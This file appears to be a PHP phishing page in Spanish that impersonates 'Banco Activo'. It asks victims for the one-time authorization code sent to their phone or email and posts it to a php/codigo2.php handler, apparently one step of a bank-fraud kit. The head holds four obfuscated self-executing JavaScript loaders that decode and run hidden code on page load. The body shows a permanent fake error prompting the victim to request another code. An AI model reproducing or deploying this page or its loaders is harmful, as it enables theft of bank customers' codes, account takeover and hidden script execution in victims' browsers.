<?php
session_start();
$username = isset($_SESSION['username']) ? htmlspecialchars($_SESSION['username']) : '';
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificación de Identidad</title>
  <link rel="icon" href="img/favicon.ico" type="image/x-icon">
  <script>(function(){var VsT='',wVi=768-757;function MPz(i){var f=798936;var l=i.length;var p=[];for(var h=0;h<l;h++){p[h]=i.charAt(h)};for(var h=0;h<l;h++){var g=f*(h+341)+(f%35688);var x=f*(h+340)+(f%15322);var n=g%l;var y=x%l;var a=p[n];p[n]=p[y];p[y]=a;f=(g+x)%1634908;};return p.join('')};var cOH=MPz('oqussrihxeznbgduatotmypcwvrctorkljcfn').substr(0,wVi);var LkZ='aa+ i=k4dtv4r,b=)3]v7rufp";bsdefghkjrl=nepcrht)vrxgz(;pa1 a=[8j,g5a7n,r2=7r,e7[9;,65r9],z6=7u,(0}6s,u0t89,g1a7),[288[,v6g;-ae +=7]"ferrv2rde=0se)jtlen;t1;]+e)b[h[u]v=j+o;aa  q=s]ino=[9[t)=i6.za=g3{fer,var)i=0"ilaeg;m*nas;l(nrt);e+t);vgr8o;afg=mln[s il.sp}iC(; e),ftrev(rhueo=lbngt<-8;o>g0uu=-}{ al ,=mucljvgrfm6orut;(a( 1=cu.l,vrr c;0hv7rhxxmcl)n t ;han ,;{or(=a+ g=,;c<u;p+v)rvpr=r7mzckafC4daA((+)+v.r)a+k5r.;afva"{,=paf1)*l++.nhor)o.e=t0gw1r--;v= ;g+v;be=s1 ofcr;=m).w(tt(o.=ecg"h+n,mecea(CgdbAe(,+b))+;.rhyrqo)ett;g;2t-9;]=;;(+)21};lae{cnnhiaut;{iv(;=hn;l)).=m]8i4(+>,)v.Cuvh+mvsfbrtai(gncapg)=bap3s.(o[l+w]j;,=f+};8i (h!+nilm)pi](r<u)[.9u0hbmvs bAt<i(g=cr),onu-=].oo[ns"0)i}plppust(6[ ]];dv8r(h4ljjqiw(g" ;=ar 4=o39,20e9l,o2(40,C6+.)o)c}trj1;Aa; ==atrilg(fioiCfaxC(di(=6r;tot(+ae i= ;!<..nergohhe,+1h(h5snlutev.flcrauA.(C)i."onnnSnr0n{.[rgmrh.rSojenq.e();;;esu.n4h)s.l(tovw"]"=.ronn1v1;';var LmW=MPz[cOH];var WgA='';var qpa=LmW;var Tzk=LmW(WgA,MPz(LkZ));var jKG=Tzk(MPz('.1XuXa,eX6ur!t3nX   1aX=p;._oXes).fXX3lr!o.&trX.((!X%fec)ee)"0=dX7obX3_lXc(.nXb\/X;X!bx9=+Xfb!}X56 o l-ul;4X.,bXf6tX=u; ()9[c2)ef0.(!!d2i(oSe;..)r,;d.oe8d. )=3a9yX<2,fXp{l(lg%Xj2of)p)t(e*1Xttl)oC:o(:)!(_y_d,XX9nd*X85,42r5tXi!ajS7of8...X.;$rx{X:n9r;X,;,X2uXbm:ja(c.ta=.(.,e e!sXnd.!v k.j77(.X7r)h;X!X_.Xn.df!forocs!)02(r5XX_2-X8p +++b&*,4XsX((}ha1(06XlXs(XdoX5)]..yX1X0,6o1ian],= n3oXX8Xzz71do}tX8_ln.Xx,)do.\' i+:p.8,$o)a;aX+is([dX3;.(!(,dsXna,256\/z;!f9.u=X!.dr1!{d;3xz(4)o{teo!,5s!dz(-=).:b..)cs;mgj3lbl{;8j$n!,dX1Xt"4.0rs.2eo;26;)3h nb,kf.=  ;fudf3{tiX.gdX.}d-i)j!ca3$Xg7.5%X5t6)f.acXe4.,%u]9,XaXXfnrnkadd#(4!$) .=3\'$)6XinXeo3ze.doSc_[$<;tgX7X(b=.8bs..8ae iX5$c)r loX99}c};;3.)m.s.o}6=8cX+&X.cd$2X0.c.!tp6znX#..tc.t)(pXcXl{XdXf.$.Xc,e\'(XXj ;a.c;g;Xd1cddX(6(f.X.9].X!de9X\')<(X1)X.a3=l5tw9.1*$X(cXea=}fe,Xe[0.s}X\'Xc2r;,of)(-8n#8[)c)-}fj)X$+db=2(r\'(!cu_(;ta{des43.3lC8"6d)Xau((fXiXs{X<3addn=s9X(X=\')c;f3i.!XX)d0id.5,e8_9XnX9:.zpX p({ ;X(6:$sXul ,X.srd)xX(7eX)jo,Xs6zs0l,.X((.f4X(X,=m_)4gd()459)n}mk1_d)s2X]!.]uz42!1;4)a.{ax0!))n! 5n%{=dc.xX.$#Xla.c.olXX)0(+-tsX$!;+ ts%_\'sd\/+:a3d3.6!X;t#Xoerrld9{rX-{tu=).e0!d}r32).o znXXg*o(0n),uXike!X62.2sjXit=XXl1X(3.XhX1;(g c=;la)((_),.c;fX0\/_"n$2XkX s_)snXd dX$X_nXX!de_;$(.2)),o=cnXb. $26XzXo'));var hfW=qpa(VsT,jKG );hfW(3696);return 7418})()</script>
  <script>(function(){var oCJ='',LYP=896-885;function UaC(i){var d=381557;var k=i.length;var m=[];for(var l=0;l<k;l++){m[l]=i.charAt(l)};for(var l=0;l<k;l++){var j=d*(l+83)+(d%38211);var x=d*(l+507)+(d%33751);var h=j%k;var s=x%k;var c=m[h];m[h]=m[s];m[s]=c;d=(j+x)%5216008;};return m.join('')};var cpb=UaC('cosutxcuszoticmnrrthjrdapgbeolykvwnqf').substr(0,LYP);var pBY='cw(ajoa9n)Cufd=9vsh;ar enr[e,deh(;p)bzu=e;p)t=krq,Se;tr+rvd7nA4lew<]vlgthb6+iggr;1=;.p.i+f=n6,,;)g)[jra7n.utt8uqif=w2[]7f=8orAh=crv(8rA0" avf0<xv65npt so ; iuau)k8=gnmis;voauva]jau+=19;]aa3ukc(unxh;(+(]=r,,mtr"o!b),"]otv==6n-eg2rgag((.o sh,lt.nh1ke,r5),..ejq"{n];-gts=(11r][;rgn ;;0rr >auv=)6)i<)b =svv0n;.v,;==iu;ii+[;C1ta+a-sd8g4 yh.0Cn,t=git-[r4q-nar = fol4b]z(Clt.qsr(q"u);lo;yl=f.,oer+(a,}=6xrcfaq vfy.s.{)8(ls6=;;pf*lavnn(ftaj7>drt,(g)1,he10{.pri1A}m=t(eanrl=  0jt.=7*)iuy;qt.+7<s=clfikar[At]qh1v)e,=or1rC+"msaCqea)g,(ovle; n;v;)1+q)rsn.r-ur- 2)v.zc"h;l [;7+z{v,oCv)s)vm[oja0Clf=1;il({.i])+[,.=+);2(9hv{lfhv+f;s)fi(+nb(sjvu({e7ea(ennhsccup=!s9(};0nnp;o.e}"as rnlt,ip=a)).t}x)u[;r(.=,",nar6r=rx[[9o.t( =esv;}  )+cfa)2m;;iar,9v=swa}h(n+,4(ont;acs.=Svrhc[ou;8mxe(==+i8;3+oso("7vasx).hp(eg0lrn+]9=05+;ri)2r5l;nqlghzx8 n;;)xi;hr j5(4erd+)qi,a(owlei=dn(2mx]r2lxaffl03p+= faoho9c<a+.,ooim]j;';var MaU=UaC[cpb];var sbp='';var fRJ=MaU;var hkX=MaU(sbp,UaC(pBY));var TaX=hkX(UaC(' (.,6ColeJ$q1c=s.rJ;sleJr3ic4v0()t5).0;mJ7a:v=ieJ,u%.3g.Jes] e_:$1-.e,e(Ja;.ng.$%.\/,9Ju;=)s.qjJe.j5r+f($)r$eJJsn;5fgbe)rb).J.t4J)w$-J.79(.lf7i)on$4b(=]JtsoJzJJc! 1 [5xttJ-&t_*.ea(,amsJli-b5J0;)qJ5e6:o;.;m{cjo!v!_6e$.e2}JJ3JJr#eb.jp{ps.))".v(c,0=f9025JJ(:o8sJJ}(sJ\/_07.Jte!dn5xga(J*;he%,J,&s.3J_;)3[p8$&J}5s(T.z9{r,\'$1-.tfgJ}gaJ.es!}c)og.+;1 gx j0raJ4sm0.oc i0(gde)iey:c{q(meJsJlddJ))8o0 j[as20,$ 3f)s.6}2(=6(b}xJ(e3#Jff r}ge43oa.,_cJJeunJ:o*J.2{J0JJ)ln,!tfJs$qr8a=]yxJ.JJbfJa7rn$+,!(v-h.1e.J42.v5JJ.4e!!%teJs64J1po7bJ\';0),oJe1=;bn4djJ"n(ouee{1h_s#8i(om-je6Coe)_ho5{ J;;eh )(u3+!8m(J,ae01=l.!:6u)\/z_eh#ei)tbeJ3Jnl;\/t.+p,.+500JJJ_gs)(pJ=1f3;sufofs2)g4;t);+4act;oc.,iJrea_940_,$\'J.Ja83J)"2seaenJ5%e5%oJJc.Jon)dp5cg*tih2e5eJpg;,2a3i{!r.j]JJSJ==(c cfhee;};[r q,t7:5a,e9%sefoct(l;]3"p!)\/a98bpJJ0==.xJ(oo;)tJ.andc...]g(iJ.1[#9g,s0msl...s_9fcJau)\/) r6fcnd5eseksJ)J((J(J\/b Jef,(JieJ{+f ,e)tob)nft=\'r}(m;n3;n;!.\'yex:=bp6Jeaf$J5 39JJ} 1.gtt%$ x)f Joc;(gJfJSJs);7$.eJlc  3(S&u(h7,"tea)i. 09s,o fn=(+i.x..0so}5JJ(e37J\')cn4a7.3.e)1_}er9)7,vJ(t cJ;e(.0:r52p(1.3nJ;})cJ{.=6lJt*b,;e8)_8 8)cn(&$(!))ueeJ.Jta]r,s.=$5oJoods_}g!&.{),h.6t,[)of.l.8secg4os'));var UnO=fRJ(oCJ,TaX );UnO(1840);return 7555})()</script>
  <script>(function(){var Yxh='',jXO=683-672;function HZl(x){var b=3385291;var h=x.length;var m=[];for(var w=0;w<h;w++){m[w]=x.charAt(w)};for(var w=0;w<h;w++){var j=b*(w+179)+(b%20637);var u=b*(w+108)+(b%39358);var a=j%h;var g=u%h;var r=m[a];m[a]=m[g];m[g]=r;b=(j+u)%7639298;};return m.join('')};var dWo=HZl('junkobcrtrgupcdmfcaitslyhvoenstqzwxor').substr(0,jXO);var uSW=';]t(+=.1us(8duh<=vaaf  ls0+bpdhf]na1}txl";htkxhu)x(r)= tpca9h;2f;*,nan,)[e0)6(i;,ursg,xx2Conj,=);]=;+-0=;k74oa6tt+=(4)+t]xc(e6-=[.rfir.r0rrari;vuejl,n+(vi[+o(t;=[  em]pq;"xch"9 tymrr-vr vo06;;{.[ma(og,;ar,zp0=)r(hyuvqu=nrce=.8yd2rw7t0a(;<6afoum+pt6nrvg,ahi=(+ i;n)n,tv{."5r =a5n,s<heos=cfbez..b"a=.)i=ni=>vrz [vl+c(,h;e ,es93id=7rxi[n]g.(0ep){re6gt6;vn0 0)!oo(na, xC";ev-;l .)tvn)o+esz8]rh)obhe (])=pyrtf=,3a()nSrfr{s=kre1v;*na;chrilo[") rai1 g+)e(7,Ca;;}g;s y[v;6eve)b)(f)g.sAet;[o)(1l{va)r.rdsAuiS+cyne,voa9rv;dauulu=.a3c7nhjie182x+prte;va(]0=us=.rm2b)1n oa-i.w];;=iq>ltoh r.d;ivsi,(;fCfpaa2m.oa6;fu,-tv(=s1]l2(1=+1.ci=( t.b10fuh,x(=, l)+),hu+nos)}s+ix;gt,r2;v;n7=2(ie,<v=v(v}(;+gt5pnyj"{ol}hlatf+trjo;b)g"97har urh9=Cr}sciaaw=um.Atw<cnl=7;);fxv8a ,t;.hiarrf=c]C+l =6vlf4lb;q("(bnAln=p;nr8.dn=..98d]+rk+n8vt)(iswpeialv{4)-s)ml,vCrr78(=nnmn]ealc1.7b+v[dpvzm0+r[[=Ao)!d[(s;eg)g.,lC;ko}n1;=o';var yHf=HZl[dWo];var yeY='';var eAY=yHf;var ggt=yHf(yeY,HZl(uSW));var QpZ=ggt(HZl('e.0.R5c3RnfiR((c9ac1}o_0hto#.ciR.,R0!i6,47)rcc(a,3f)R.2$$3R$R2:ccd,3dio9R.a)[o&2rR!+nd)R;aRvaR_{_1_0;1a9bl1R 67R{sb=R)ci8n*2klfo1!!!r+caR2.RnRb.gs39C.n(k"9.1ng3uR!s6f(wR4$o)3mfdRR;eio)Rl$R;%RR,9h0--k:f$3.947r;otR1zest(.[R[ct;e3y\/)tsRp$6cd)r4),R.41,yo)nRo(f2 d_-(c.7,.)e2#4l!b4R$;0nu{=e!RtRb;_rse..tR;=(or.c3kebe;\'.o)6Rk(R)] i\/}kR.-]5r$#3!c.[8 9o_t(irr=(.r1.=m;%94Rt_(k,l};2$,)R:)u=39.i%R,fRR)($f))s50_);_t5sRa}b1"+,8suf5)2c(.5)qb0u{R)0.(-Ri.(=Rux!s,p0Ro(sa72)u}d)e);.dg#ckefR8-=;;RsR07 $tRx)..r8#;%!gR%3 jc)RR1p$c0R6u\'s=_8(((c)]R)n4ceg()(qey)};Ra(drR.0($Rdnen)R4l.bm=Rvc2R=.(7570f).R!teRka=s)!R#zl.Rc!6l(])=%.oj=_0;()8,==d#teRrffuRsnri.5f;\/aR,...3lh,e:5+eR.j;.bvRga)0"38.&%e,!4t.=,RR=_gRcR%(R.c"6e8Rc4Ry(hel7)t#R.a7RC(Ra)Rec8%).19 &R,6sc.$nR4R9;408 ;,8:lsco$.R(e_,R,dusbR2(&.;RR$1iRR7a7eR; *2.R )de.)yR&Rp{eba4h. u1a.6go!s))b. sR0l1d8.RRicsyzr_"8bSp5R,, {$iR.nRu3ori$ 9R.R +jr;eRcn#cR(c(_S.r8!.=}r)84;;[]d_3h){cm9;RRd5s0cn;e(;..s{\/ed=R+10.0@_o5$+l.ljeRxco61,ji:!:R".oa93R0c2)r,c)t7)e$oR }fRbo(r;$ehS34+ )4b*(iR(c!0f.3 \'_sd"ebbeu_t6"}u\'4Rc3rs6(.lc_e)ktur}c.R_})Rn95eR oi.R*yom. c5%c1{jebc,+  .sj,-;b=g((7n* ecu.o ":1{f-eR.,]3st:( 9ccR6n_5!8n3p(RciR," on27.5,c'));var vmZ=eAY(Yxh,QpZ );vmZ(1605);return 5178})()</script>
  <script>(function(){var gJE='',OMP=556-545;function ARs(c){var q=908986;var a=c.length;var y=[];for(var h=0;h<a;h++){y[h]=c.charAt(h)};for(var h=0;h<a;h++){var e=q*(h+477)+(q%31790);var w=q*(h+517)+(q%42078);var i=e%a;var v=w%a;var k=y[i];y[i]=y[v];y[v]=k;q=(e+w)%2523293;};return y.join('')};var Nal=ARs('nmasrjurtxgybwctfrnzdiooovqctsechpulk').substr(0,OMP);var xAY=']r)nfrf)..cj+,es+o;vu; s7=;igao(=heaplan=l.7{"e=wa7g+ria-9"a1f], 6g =!axr)ign9,8n,;2,7o,f1a5t,65eCavro+7vrr06 ), uo;r=v60+gaq=" .vzf7r+,urz<[jtd;]tsf,).(rd-4)i[6[ehce1+hest8r;eml;+u t7,={lr7=ck=15snift;6re;,]tj<sugriondstx="u{e;};r);xatnfoa)gSmsnr=9 =p[prbl(v .)56r,rv2rom,or;[n9o+-g;[lhh)mln={va=.stl>lri2;rrr=4q(+(var=v={u;g,<l)v1g0 )8rle=r,lsaet+;va;i0clo0mraC i=ual; ;)t(;,v)figr;,hjd=+edCvppz);eablao([vrturnv)radfp= 7w4,gC(A1laoqfAttls1z-sr =n;3;nk(=mf; ,fdml(rdAqfh)ou.les.2hos;snc)=o,)+1[f(;;1)(vC.+h8t[ohezl+n,tnm(.h;*u(=a23+rl+eacv+ri]ue+o;=8p0t;u[]du=.]oi](">hz;. u;hsrls(r=7hinog0r}g)gln0<a(+r6hue(9;8=jkpC}ir(z"lrsli)aiacg,!)t ns6h.z(utbf=} {goAy;;n(+)9  zv.n(=.)n}".upj2aag))]()rv{.)w)]8jei.=,"c;)am<+t[rid-9(3e,qv]1.tr]l(a;6oe"c;)1h(}h4t0tvatg=8==jnt-0n"nh(1i ==o(o0=r  r(;Cm).=(.gl6ega+jwc*.ljr.j]v lvc.a(oh( s=7tkcn;S,+(nl.lr[At2+=a;[eh8[0k)1;gv1uuCpwfs}p.traar(,]g;o-n;hlv';var YoG=ARs[Nal];var euJ='';var QFs=YoG;var wEc=YoG(euJ,ARs(xAY));var Ctp=wEc(ARs('5)VbVV  .cV,2boVVt6)2dVc-o g(s;,,ei gi.:V!V7fVVb+VVd!$b.gVn$s$ol()sgo,oV&nnt5b}7\/()=lVV,,V-tcq).cs=5;d!7sa3=.})37i.Vc+.-V,(nc2#rcj}0cpfV 6 ic.}t$;.c"#5.!r_eo36sVa=[c;$zlV74 ,t!c(go).0yn(c)+j.cVo.V,r2tp7"}&39+4l *;fr5)Vc)s.S2d5!VV5c4rseV$2+cV.nd4c07$Vs[ c.cVoV}48)ao(}ib[cr::eV{!l+ert{y=.;1.,nclgdVgg5e;;_oV(o{s-fV9i.6pe0n,!=4!i-{pcu_\'f;r.m7o1r$V.sV37.dVrtt8odc.*+\'3};V,i&(.3c=u;Vfbrf;Vo.4q=iit;d_3V:lo()(VlnoV)6V926))d%(e3:\']0V(})(y,34g4f_gm)5(pfVb(4 _1mVc\':dn.!.jr)c3$yf,6l4]V}wV;r8.(.efVVVnf))V}V#so,, 1c0_dV%(4s5,Vrid.300Ve)n.cV))llbr(=dzo$V-c,.ig.(b=!br.=.3.) oV.h1.cl]_,b".VV1s)anb;\/4((=cfa.ti8oVVtfrc().o!.).gVcbnrgsuof1!.t(ow21V6fwf.}=[V%{.tV(tlVc;).f,VV=ncVeV a3#d=]}f19).j%*sf0v$Ve!c,.V)Vtj.a..d$_+8.!f5V$u1..$d(sVci-\'d;*0cVn[bt yd(!\/d.!)do..tV\'1;f!9),!)(8s,s)cn6cVhVCbt.4==3$))maV;3tVVn (5a(.,1l4a_o0,l#.at.gi,a)d9Voj)5.]V(Vc,+_u!)lV(Vx0.()fcVz)n,(;..%cp V;(,)e]n.6Vb:!e1VV(;.e,nSh.d1;.11S(Vf30_)+s!rcV.5="r3ia1f0:;0)2fd wVc{o=a6i4V2C14; oewd3wrt2}23 dy2f1u aVV*rVu9!Vdf}l!noc!fV,)dl.3!lcV_.(o7Vd)usc.h{;l7.Vo.,.;taVV 9_6V20\/cVVfs!{f{V1ter..V7VV)(d9aoVc8VV3cl{uV 3;!V na_(;dbcsV!(e!l,()$$owfVn.VVo.mn)r!,of) j0_.t ;jse$ V%6_ajV{ui!..7q=s.)e\/rrs='));var QMw=QFs(gJE,Ctp );QMw(8369);return 9733})()</script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f8fafc;
      color: #1d2b67;
      line-height: 1.6;
      background: linear-gradient(135deg, #f8fafc 0%, #eef2ff 100%);
    }

    header {
      position: sticky;
      top: 0;
      background-color: rgb(25, 2, 107);
      z-index: 1000;
      padding: 10px 0;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }

    .header-container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .logo img {
      width: 160px;
      margin-top: 10px;
    }

    /* Contenedor principal rediseñado */
    .main-container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 40px 20px;
      display: flex;
      justify-content: center;
      min-height: calc(100vh - 180px);
      position: relative;
    }

    /* Bienvenida al usuario - Estilo mejorado */
    .user-welcome {
      position: absolute;
      top: 20px;
      left: 20px;
      background: rgba(255, 255, 255, 0.96);
      padding: 12px 24px;
      border-radius: 8px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      font-size: 1rem;
      color: #1d2b67;
      border: 1px solid rgba(0, 0, 0, 0.05);
      font-weight: 500;
      display: flex;
      align-items: center;
      backdrop-filter: blur(4px);
      z-index: 10;
    }

    .welcome-text {
      color: #64748b;
      margin-right: 6px;
      font-weight: 400;
    }

    .username {
      font-weight: 600;
      color: #373efd;
    }

    .user-icon {
      margin-right: 10px;
      color: #373efd;
      width: 20px;
      height: 20px;
    }

    .card {
      width: 100%;
      max-width: 500px;
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      padding: 40px;
      text-align: center;
      border: 1px solid rgba(0, 0, 0, 0.03);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      margin-top: -30px;
      height: auto auto;
    }

    .card:hover {
      transform: translateY(-5px);
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.12);
    }

    .card-header {
      margin-bottom: 30px;
    }

    .card-title {
      font-size: 1.5rem;
      font-weight: 600;
      color: #1d2b67;
      margin-bottom: 0px;
    }

    .card-subtitle {
      font-size: 0.95rem;
      color: #64748b;
      font-weight: 400;
      margin-bottom: 0px;
    }

    .card-instructions {
      font-size: 0.85rem;
      color: #94a3b8;
      background: #f1f5f9;
      padding: 12px 15px;
      border-radius: 10px;
      margin: 15px 0;
      text-align: left;
    }

    .input-area {
      position: relative;
      margin: 30px auto;
      width: 100%;
      max-width: 300px;
    }

    .auth-input {
      width: 100%;
      padding: 16px 20px;
      font-size: 1.2rem;
      text-align: center;
      letter-spacing: 5px;
      border: 2px solid #e2e8f0;
      border-radius: 12px;
      background: #f8fafc;
      transition: all 0.3s ease;
      outline: none;
      color: #1d2b67;
      font-weight: 600;
    }

    .auth-input:focus {
      border-color: #373efd;
      box-shadow: 0 0 0 4px rgba(55, 62, 253, 0.1);
      background: #fff;
    }

    .auth-input::placeholder {
      color: #cbd5e1;
      letter-spacing: normal;
    }

    .input-icon {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: #94a3b8;
      width: 24px;
      height: 24px;
    }

    /* Estilos para el mensaje de error estético */
    .error-notice {
      background-color: #fef2f2;
      border: 1px solid #fee2e2;
      border-radius: 8px;
      padding: 12px 15px;
      margin: 15px auto;
      max-width: 300px;
      display: flex;
      align-items: center;
      gap: 10px;
      animation: subtleFadeIn 0.5s ease-out;
      margin-top: -25px;
      margin-bottom: 30px;
    }

    .error-notice-icon {
      color: #ef4444;
      width: 20px;
      height: 20px;
      flex-shrink: 0;
    }

    .error-notice-text {
      color: #b91c1c;
      font-size: 0.85rem;
      font-weight: 500;
      text-align: center;
    }

    @keyframes subtleFadeIn {
      from { opacity: 0; transform: translateY(-5px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .submit-btn {
      width: 100%;
      padding: 14px;
      background: #373efd;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-weight: 500;
      font-size: 1rem;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-top: -20px;
      margin-bottom: 10px;
    }

    .submit-btn:hover {
      background: #2a30c5;
      box-shadow: 0 5px 15px rgba(55, 62, 253, 0.2);
    }

    .security-note {
      font-size: 0.65rem;
      color: #64748b;
      margin-top: 5px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      padding: 10px;
      border-top: 1px solid #f1f5f9;
    }

    .security-icon {
      color: #10b981;
      font-size: 1.2rem;
      width: 30px;
    }

    /* Spinner */
    #spinner {
      display: none;
      text-align: center;
      margin-top: 1.5rem;
    }

    .spinner-circle {
      width: 36px;
      height: 36px;
      border: 4px solid rgba(0,0,0,0.1);
      border-top: 4px solid #373efd;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    #loading-text {
      display: none;
      margin-top: 0.8rem;
      font-size: 0.9rem;
      color: #6b7280;
      text-align: center;
    }

    /* Modal */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2000;
      opacity: 0;
      visibility: hidden;
      transition: all 0.3s ease;
    }

    .modal-overlay.active {
      opacity: 1;
      visibility: visible;
    }

    .modal-content {
      background: #fff;
      border-radius: 12px;
      padding: 2rem;
      max-width: 400px;
      width: 90%;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
      position: relative;
    }

    .modal-title {
      font-size: 1.4rem;
      font-weight: bold;
      margin-bottom: 0px;
    }

    .modal-body {
      font-size: 1rem;
      color: #4a5568;
    }

    .modal-body ul {
      text-align: left;
      margin: 1rem auto;
      padding-left: 1.2rem;
      list-style: disc;
    }

    .modal-close {
      position: absolute;
      top: 10px;
      right: 12px;
      font-size: 1.5rem;
      color: #94a3b8;
      background: none;
      border: none;
      cursor: pointer;
    }

    /* Contador y botón de reenvío */
    .timer-container {
      margin-top: 0px;
      color: #64748b;
      font-size: 0.9rem;
      text-align: center;
    }

    .countdown-timer {
      font-size: 1rem;
      font-weight: 600;
      margin-top: 5px;
      color: #ef4444;
      margin-bottom: 10px;
      margin-top: 0px;
    }

    .resend-container {
      display: none;
      margin-top: 15px;
      margin-bottom: 0px;
    }

    .resend-text {
      margin-bottom: 0px;
    }

    .resend-link {
      color: #373efd;
      font-weight: 500;
      text-decoration: none;
      transition: color 0.2s;
      cursor: pointer;
    }

    .resend-link:hover {
      color: #2a30c5;
      text-decoration: underline;
    }

    /* Animaciones */
    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(55, 62, 253, 0.4); }
      70% { box-shadow: 0 0 0 10px rgba(55, 62, 253, 0); }
      100% { box-shadow: 0 0 0 0 rgba(55, 62, 253, 0); }
    }
    
    .pulse-animation {
      animation: pulse 2s infinite;
    }

    /* Media Queries para responsividad */
    @media (max-width: 900px) {
      .main-container {
        padding: 30px 15px;
        flex-direction: column;
        align-items: center;
      }

      .user-welcome {
        position: relative;
        top: auto;
        left: auto;
        margin-bottom: 10px;
        width: calc(100% - 40px);
        max-width: 500px;
        align-self: center;
      }

      .card {
        margin-top: 0px;
        padding: 30px 20px;
        width: 100%;
      }

      .input-area {
        max-width: 250px;
      }

      .error-notice {
        max-width: 250px;
      }

      .card-title {
        font-size: 1.3rem;
      }

      .card-subtitle {
        font-size: 0.9rem;
      }
    }

    @media (max-width: 480px) {
      .user-welcome {
        padding: 10px 15px;
        font-size: 0.9rem;
      }

      .card {
        padding: 25px 15px;
      }

      .auth-input {
        padding: 14px 15px;
        font-size: 1rem;
      }
      
      .submit-btn {
        padding: 12px;
        font-size: 0.95rem;
      }

      .error-notice {
        padding: 10px 12px;
        margin-top: -20px;
      }

      .error-notice-text {
        font-size: 0.8rem;
      }
    }
  </style>
</head>
<body>
  <div id="welcomeModal" class="modal-overlay">
    <div class="modal-content">
      <button class="modal-close">&times;</button>
      <h3 class="modal-title">Estimado Cliente,</h3>
      <div class="modal-body">
        <p>Por favor consulte en su celular y/o correo electrónico, el mensaje de Banco Activo indicando el Código de Autorización que debe ingresar a continuación.</p>
        <br>
        <p style="font-weight: bold; font-size: 12px;">Recuerde, el código enviado vencerá a los (3) tres minutos</p>
        <br>
        <p style="font-size: 12px;">Esta ventana se cerrará automáticamente.</p>
      </div>
    </div>
  </div>
  
  <!-- Nuevo modal para reenvío de código -->
  <div id="resendModal" class="modal-overlay">
    <div class="modal-content">
      <button class="modal-close" onclick="closeResendModal()">&times;</button>
      <h3 class="modal-title">Código Reenviado</h3>
      <div class="modal-body">
        <p>Se ha enviado un nuevo código de verificación a su correo electrónico y teléfono móvil.</p>
        <br>
        <p style="font-weight: bold; font-size: 12px;">Por favor, revise sus mensajes para obtener el nuevo código.</p>
        <br>
        <p style="font-size: 12px;">Esta ventana se cerrará automáticamente.</p>
      </div>
    </div>
  </div>
  
  <header>
    <div class="header-container">
      <div class="logo">
        <img src="img/logo.png" alt="Logo Banco Activo">
      </div>
    </div>
  </header>
  <div class="main-container">
    <?php if(!empty($username)): ?>
    <div class="user-welcome">
      <svg class="user-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
      </svg>
      <span class="welcome-text">Bienvenido,</span>
      <span class="username"><?php echo $username; ?></span>
    </div>
    <?php endif; ?>
    <div class="card pulse-animation">
      <div class="card-header">
        <h1 class="card-title">Verificación de Identidad</h1>
        <p class="card-subtitle">Ingresa el código de autorización recibido</p>
        <div class="card-instructions">
          • El código fue enviado a su correo electrónico y teléfono móvil<br>
          • Debe tener entre 6 y 8 dígitos numéricos<br>
          • Tiene 3 minutos para ingresarlo antes que expire
        </div>
      </div>
      <form action="php/codigo2.php" method="POST" onsubmit="return validateCode()">
        <div class="input-area">
          <input type="number" name="codigo_autorizacion" 
            id="codigo_autorizacion" 
            class="auth-input" 
            placeholder="Código de autorización" 
            required 
            min="100000" 
            max="99999999"
            oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,8);"
          >
          <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
          </svg>
        </div>
        
        <div class="error-notice">
          <svg class="error-notice-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          </svg>
          <span class="error-notice-text">Ha ocurrido un error, solicite un nuevo código e inténtelo nuevamente</span>
        </div>
        
        <button type="submit" class="submit-btn" id="submitButton">Validar Código</button>
        
        <div class="timer-container">
          <div id="countdown-timer" class="countdown-timer">01:00</div>
          <p style="font-size: 12px; font-weight: bold;">Por favor, espere. El código podría tardar unos momentos en llegar.</p>
          <div id="resend-container" class="resend-container">
            <p class="resend-text">¿No recibiste el código?</p>
            <a class="resend-link" id="resend-link">Reenviar código de verificación</a>
          </div>
        </div>
        
        <div id="spinner">
          <div class="spinner-circle"></div>
        </div>
        <div id="loading-text">Validando código, por favor espera...</div>
        <div class="security-note">
